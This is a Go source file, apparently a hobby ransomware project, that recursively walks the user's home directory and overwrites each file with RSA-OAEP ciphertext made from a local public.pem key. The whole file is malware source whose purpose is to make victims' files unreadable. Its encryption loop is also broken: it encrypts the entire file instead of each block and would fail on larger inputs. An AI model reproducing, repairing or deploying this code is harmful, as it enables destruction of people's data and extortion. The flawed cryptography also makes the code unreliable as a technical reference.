package ransomeware

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha512"
	"crypto/x509"
	"encoding/pem"
	"log"
	"os"
	"path/filepath"
)

const DEBUG bool = true // false for production

func Ransomeware() {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	if DEBUG {
		homeDir, err = os.Getwd()
		if err != nil {
			log.Fatal(err)
		}
		homeDir = filepath.Join(homeDir, "/debug/")
	}
	//fmt.Println(homeDir)
	var files []string
	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && info.Size() > 1 {
			files = append(files, path)
			/*fmt.Println(path)
			fmt.Println("----------------------------------------------------------------")*/
			EncryptFile(path)
			//fmt.Println("----------------------------------------------------------------")

		}
		return nil
	})
	if err != nil {
		log.Fatal(err)
	}

	//return files, err

}

func EncryptFile(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		log.Fatal("Error while reading file " + err.Error())
		return
	}
	//fmt.Println(data)
	/* Generate public and private key
	privatekey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		log.Fatal("Error while generating private key " + err.Error())
		return
	}
	publickey := privatekey.PublicKey

	var privatekeyBytes []byte = x509.MarshalPKCS1PrivateKey(privatekey)
	privateKeyBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privatekeyBytes,
	}
	privatePem, err := os.Create("private.pem")
	if err != nil {
		fmt.Printf("error when create private.pem: %s \n", err)
		os.Exit(1)
	}
	err = pem.Encode(privatePem, privateKeyBlock)
	if err != nil {
		fmt.Printf("error when encode private pem: %s \n", err)
		os.Exit(1)
	}

	// dump public key to file
	publicKeyBytes, err := x509.MarshalPKIXPublicKey(&publickey)
	if err != nil {
		fmt.Printf("error when dumping publickey: %s \n", err)
		os.Exit(1)
	}
	publicKeyBlock := &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: publicKeyBytes,
	}
	publicPem, err := os.Create("public.pem")
	if err != nil {
		fmt.Printf("error when create public.pem: %s \n", err)
		os.Exit(1)
	}
	err = pem.Encode(publicPem, publicKeyBlock)
	if err != nil {
		fmt.Printf("error when encode public pem: %s \n", err)

	}*/
	publicKeyPath, _ := os.Getwd()
	publicKeyPath = filepath.Join(publicKeyPath, "public.pem")
	publickey, err := os.ReadFile(publicKeyPath)
	if err != nil {
		log.Fatal("Error while reading public.pem " + err.Error())
	}
	publicKey, err := convertBytesToPublicKey(publickey)
	if err != nil {
		log.Fatal("Error while converting bytes to public key " + err.Error())
	}
	//fmt.Println(publicKey)
	dataBytes := []byte(data)
	var ciphertext string
	for i := 0; i < int(len(dataBytes)); i++ {
		blockData := [512]byte{}
		for j := 0; i < int(len(dataBytes)) && j < 512; i++ {
			blockData[j] = dataBytes[i]
			j++
		}
		ct, err := rsa.EncryptOAEP(sha512.New(), rand.Reader, publicKey, []byte(data), []byte(path))
		if err != nil {
			log.Fatal("Error while encrypting " + err.Error())
			os.Exit(0)
		}
		ciphertext = ciphertext + string(ct)
	}
	//fmt.Println("ciphertext")

	//fmt.Println(ciphertext)
	err = os.WriteFile(path, []byte(ciphertext), 0777)
	if err != nil {
		log.Fatal("Error while writing data to file " + err.Error())
		return
	}
}

func convertBytesToPublicKey(keyBytes []byte) (*rsa.PublicKey, error) {
	var err error

	block, _ := pem.Decode(keyBytes)
	blockBytes := block.Bytes

	publicKey, err := x509.ParsePKIXPublicKey(blockBytes)
	if err != nil {
		return nil, err
	}
	PublicKey := publicKey.(*rsa.PublicKey)
	return PublicKey, nil
}
